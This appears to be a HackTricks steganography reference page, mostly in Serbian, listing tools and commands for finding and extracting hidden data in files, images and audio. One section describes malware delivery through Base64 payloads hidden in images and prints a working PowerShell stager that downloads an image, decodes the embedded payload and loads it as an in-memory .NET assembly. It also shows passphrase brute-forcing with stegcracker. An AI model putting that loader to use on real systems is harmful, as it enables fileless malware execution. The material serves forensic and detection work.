# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Izdvajanje podataka iz fajlova**

### **Binwalk**

Alat za pretraživanje binarnih fajlova u potrazi za ugrađenim skrivenim fajlovima i podacima. Instalira se preko `apt`, a njegov izvorni kod je dostupan na [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Vraća fajlove na osnovu njihovih zaglavlja i podnožja, korisno za png slike. Može se instalirati preko `apt`, a izvorni kod je na [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Pomaže za pregled metapodataka fajla, dostupan [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Slično exiftool, za pregled metapodataka. Može se instalirati preko `apt`, izvorni kod na [GitHub](https://github.com/Exiv2/exiv2), i ima [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Identifikujte tip fajla sa kojim radite.

### **Strings**

Ekstrahuje čitljive nizove iz fajlova, koristeći različita podešavanja kodiranja za filtriranje izlaza.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Upoređivanje (cmp)**

Koristan za upoređivanje izmenjenog fajla sa njegovom originalnom verzijom pronađenom na internetu.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Ekstrakcija skrivenih podataka u tekstu**

### **Skriveni podaci u razmacima**

Nevidljivi karakteri u naizgled praznim razmacima mogu da kriju informacije. Da biste izvukli ove podatke, posetite [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Ekstrakcija podataka iz slika**

### **Identifikovanje detalja slike pomoću GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) služi za određivanje tipova fajlova slike i identifikaciju potencijalne korupcije. Izvršite naredbu ispod da biste pregledali sliku:
```bash
./magick identify -verbose stego.jpg
```
Da biste pokušali da popravite oštećenu sliku, dodavanje metadata comment-a može pomoći:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide za prikrivanje podataka**

Steghide omogućava skrivanje podataka u `JPEG, BMP, WAV, and AU` fajlovima, i može da ugradjuje i ekstrahuje enkriptovane podatke. Instalacija je jednostavna koristeći `apt`, a njegov [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Komande:**

- `steghide info file` prikazuje da li fajl sadrži skrivene podatke.
- `steghide extract -sf file [--passphrase password]` ekstrahuje skrivene podatke, lozinka opciono.

Za ekstrakciju putem weba, posetite [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Za pokušaj razbijanja lozinke na Steghide, koristite [stegcracker](https://github.com/Paradoxis/StegCracker.git) na sledeći način:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg se specijalizuje za otkrivanje skrivenih podataka u PNG i BMP datotekama. Instalacija se radi putem `gem install zsteg`, a izvor je na [GitHub](https://github.com/zed-0xff/zsteg).

**Komande:**

- `zsteg -a file` primenjuje sve metode detekcije na datoteci.
- `zsteg -E file` navodi payload za ekstrakciju podataka.

### **StegoVeritas and Stegsolve**

**stegoVeritas** proverava metapodatke, vrši transformacije slike i primenjuje LSB brute forcing među ostalim funkcijama. Koristite `stegoveritas.py -h` za punu listu opcija i `stegoveritas.py stego.jpg` da izvršite sve provere.

**Stegsolve** primenjuje razne filtere boja kako bi otkrio skrivene tekstove ili poruke u slikama. Dostupan je na [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) techniques mogu otkriti skriveni sadržaj u slikama. Korisni resursi uključuju:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy omogućava ugradnju informacija u slike i audio datoteke, podržava formate kao što su PNG, BMP, GIF, WebP i WAV. Dostupan je na [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Za analizu PNG datoteka ili za proveru njihove autentičnosti, koristite:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Dodatni alati za analizu slika**

Za dalje istraživanje, razmotrite posetu:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Base64 payloads ograničeni markerima sakriveni u slikama (malware delivery)

Commodity loaders sve češće kriju Base64-encoded payloads kao običan tekst unutar inače validnih slika (često GIF/PNG). Umesto pixel-level LSB, payload je ograničen jedinstvenim start/end marker stringovima ugrađenim u tekst/metapodatke fajla. PowerShell stager zatim:
- Preuzima sliku preko HTTP(S)
- Pronalazi marker stringove (posmatrani primeri: <<sudo_png>> … <<sudo_odt>>)
- Ekstrahuje tekst između markera i Base64-dekodujući ga u bajtove
- Učitava .NET assembly u memoriji i poziva poznatu entry metodu (nema fajla zapisanog na disk)

Minimalni PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Napomene
- Ovo spada pod ATT&CK T1027.003 (steganography). Nizovi markera variraju između kampanja.
- Hunting: skenirajte preuzete slike za poznate delimitere; označite `PowerShell` koji koristi `DownloadString` praćeno `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Ekstrakcija podataka iz audio zapisa**

**Audio steganography** nudi jedinstven metod za skrivanje informacija unutar audio fajlova. Različiti alati se koriste za ugrađivanje ili izvlačenje skrivenog sadržaja.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide je svestran alat namenjen za skrivanje podataka u JPEG, BMP, WAV i AU fajlovima. Detaljna uputstva su data u [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Ovaj alat je kompatibilan sa više formata, uključujući PNG, BMP, GIF, WebP i WAV. Za više informacija, pogledajte [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg je ključan za procenu integriteta audio fajlova, prikazujući detaljne informacije i ukazujući na eventualne nepravilnosti.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg se ističe u skrivanju i izdvajanju podataka u WAV fajlovima koristeći strategiju najmanje značajnog bita. Dostupan je na [GitHub](https://github.com/ragibson/Steganography#WavSteg). Komande uključuju:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound omogućava enkripciju i otkrivanje informacija u audio fajlovima koristeći AES-256. Može se preuzeti sa [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Neprocenjiv alat za vizuelnu i analitičku inspekciju audio fajlova, Sonic Visualizer može otkriti skrivene elemente nevidljive drugim metodama. Posetite [official website](https://www.sonicvisualiser.org/) za više informacija.

### **DTMF Tones - Dial Tones**

Detekcija DTMF tonova u audio fajlovima može se postići putem online alata poput [this DTMF detector](https://unframework.github.io/dtmf-detect/) i [DialABC](http://dialabc.com/sound/detect/index.html).

## **Ostale tehnike**

### **Binary Length SQRT - QR Code**

Binarni podaci čija dužina ima celobrojni kvadratni koren mogu predstavljati QR code. Koristite ovaj snippet da proverite:
```python
import math
math.sqrt(2500) #50
```
Za pretvaranje binarnog u sliku, pogledajte [dcode](https://www.dcode.fr/binary-image). Za čitanje QR kodova, koristite [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Prevođenje Brajevog pisma**

Za prevođenje Brajevog pisma, [Branah Braille Translator](https://www.branah.com/braille-translator) je odličan resurs.

## **References**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
